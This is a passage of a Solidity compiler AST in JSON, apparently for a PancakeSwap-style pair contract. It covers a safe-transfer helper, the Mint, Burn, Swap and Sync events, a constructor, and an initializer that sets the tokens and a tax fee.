																	"argumentTypes": null,
																	"id": 1069,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2343,
																	"src": "2054:3:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 1070,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodeWithSelector",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "2054:22:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithselector_pure$_t_bytes4_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (bytes4) pure returns (bytes memory)"
																}
															},
															"id": 1074,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2054:43:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1067,
															"name": "token",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1056,
															"src": "2030:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 1068,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "2030:10:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 1075,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2030:77:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1994:113:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1091,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1078,
																"name": "success",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1064,
																"src": "2138:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 1089,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1082,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"expression": {
																					"argumentTypes": null,
																					"id": 1079,
																					"name": "data",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1066,
																					"src": "2150:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				},
																				"id": 1080,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "length",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": null,
																				"src": "2150:11:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "==",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 1081,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "2165:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			},
																			"src": "2150:16:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "||",
																		"rightExpression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1085,
																					"name": "data",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1066,
																					"src": "2181:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				},
																				{
																					"argumentTypes": null,
																					"components": [
																						{
																							"argumentTypes": null,
																							"id": 1086,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"lValueRequested": false,
																							"nodeType": "ElementaryTypeNameExpression",
																							"src": "2188:4:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_type$_t_bool_$",
																								"typeString": "type(bool)"
																							},
																							"typeName": "bool"
																						}
																					],
																					"id": 1087,
																					"isConstant": false,
																					"isInlineArray": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "TupleExpression",
																					"src": "2187:6:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_bool_$",
																						"typeString": "type(bool)"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					},
																					{
																						"typeIdentifier": "t_type$_t_bool_$",
																						"typeString": "type(bool)"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1083,
																					"name": "abi",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2343,
																					"src": "2170:3:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_magic_abi",
																						"typeString": "abi"
																					}
																				},
																				"id": 1084,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"memberName": "decode",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": null,
																				"src": "2170:10:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_abidecode_pure$__$returns$__$",
																					"typeString": "function () pure"
																				}
																			},
																			"id": 1088,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "2170:24:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "2150:44:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	}
																],
																"id": 1090,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "2149:46:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "2138:57:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a205452414e534645525f4641494c4544",
															"id": 1092,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2209:26:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_4a184d07b37269afc05419c3e30fc72fcfc73d01055a62dee4e00c06fa61eb4a",
																"typeString": "literal_string \"Pancake: TRANSFER_FAILED\""
															},
															"value": "Pancake: TRANSFER_FAILED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_4a184d07b37269afc05419c3e30fc72fcfc73d01055a62dee4e00c06fa61eb4a",
																"typeString": "literal_string \"Pancake: TRANSFER_FAILED\""
															}
														],
														"id": 1077,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "2117:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1093,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2117:128:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1094,
												"nodeType": "ExpressionStatement",
												"src": "2117:128:6"
											}
										]
									},
									"documentation": null,
									"id": 1096,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_safeTransfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1061,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1056,
												"name": "token",
												"nodeType": "VariableDeclaration",
												"scope": 1096,
												"src": "1937:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1055,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1937:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1058,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1096,
												"src": "1952:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1057,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1952:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1060,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1096,
												"src": "1964:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1059,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "1964:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1936:39:6"
									},
									"returnParameters": {
										"id": 1062,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1984:0:6"
									},
									"scope": 2224,
									"src": "1914:338:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 1104,
									"name": "Mint",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1103,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1098,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 1104,
												"src": "2269:22:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1097,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2269:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1100,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 1104,
												"src": "2293:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1099,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2293:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1102,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 1104,
												"src": "2307:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1101,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2307:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2268:52:6"
									},
									"src": "2258:63:6"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 1114,
									"name": "Burn",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1113,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1106,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 1114,
												"src": "2346:22:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1105,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2346:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1108,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 1114,
												"src": "2378:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1107,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2378:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1110,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 1114,
												"src": "2400:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1109,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2400:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1112,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1114,
												"src": "2422:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1111,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2422:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2336:110:6"
									},
									"src": "2326:121:6"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 1128,
									"name": "Swap",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1127,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1116,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 1128,
												"src": "2472:22:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1115,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2472:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1118,
												"indexed": false,
												"name": "amount0In",
												"nodeType": "VariableDeclaration",
												"scope": 1128,
												"src": "2504:14:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1117,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2504:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1120,
												"indexed": false,
												"name": "amount1In",
												"nodeType": "VariableDeclaration",
												"scope": 1128,
												"src": "2528:14:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1119,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2528:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1122,
												"indexed": false,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 1128,
												"src": "2552:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1121,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2552:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1124,
												"indexed": false,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 1128,
												"src": "2577:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1123,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2577:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1126,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1128,
												"src": "2602:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1125,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2602:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2462:164:6"
									},
									"src": "2452:175:6"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 1134,
									"name": "Sync",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1133,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1130,
												"indexed": false,
												"name": "reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 1134,
												"src": "2643:16:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1129,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2643:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1132,
												"indexed": false,
												"name": "reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 1134,
												"src": "2661:16:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1131,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2661:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2642:36:6"
									},
									"src": "2632:47:6"
								},
								{
									"body": {
										"id": 1147,
										"nodeType": "Block",
										"src": "2706:66:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1140,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1137,
														"name": "factory",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 966,
														"src": "2716:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1138,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2356,
															"src": "2726:3:6",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 1139,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "2726:10:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "2716:20:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 1141,
												"nodeType": "ExpressionStatement",
												"src": "2716:20:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1145,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1142,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 986,
														"src": "2747:5:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1143,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2356,
															"src": "2755:3:6",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 1144,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "2755:10:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "2747:18:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 1146,
												"nodeType": "ExpressionStatement",
												"src": "2747:18:6"
											}
										]
									},
									"documentation": null,
									"id": 1148,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1135,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2696:2:6"
									},
									"returnParameters": {
										"id": 1136,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2706:0:6"
									},
									"scope": 2224,
									"src": "2685:87:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1177,
										"nodeType": "Block",
										"src": "2941:167:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 1161,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1158,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2356,
																	"src": "2959:3:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 1159,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "2959:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 1160,
																"name": "factory",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 966,
																"src": "2973:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "2959:21:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20464f5242494444454e",
															"id": 1162,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2982:20:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_f0c1e1712466d3d36724e0a82edec721666e68b8fe9433d191f13e7c47aec611",
																"typeString": "literal_string \"Pancake: FORBIDDEN\""
															},
															"value": "Pancake: FORBIDDEN"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_f0c1e1712466d3d36724e0a82edec721666e68b8fe9433d191f13e7c47aec611",
																"typeString": "literal_string \"Pancake: FORBIDDEN\""
															}
														],
														"id": 1157,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "2951:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1163,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2951:52:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1164,
												"nodeType": "ExpressionStatement",
												"src": "2951:52:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1167,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1165,
														"name": "token0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 968,
														"src": "3033:6:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1166,
														"name": "_token0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1150,
														"src": "3042:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "3033:16:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 1168,
												"nodeType": "ExpressionStatement",
												"src": "3033:16:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1171,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1169,
														"name": "token1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 970,
														"src": "3059:6:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1170,
														"name": "_token1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1152,
														"src": "3068:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "3059:16:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 1172,
												"nodeType": "ExpressionStatement",
												"src": "3059:16:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1175,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1173,
														"name": "taxfee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 972,
														"src": "3085:6:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1174,
														"name": "_taxfee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1154,
														"src": "3094:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3085:16:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1176,
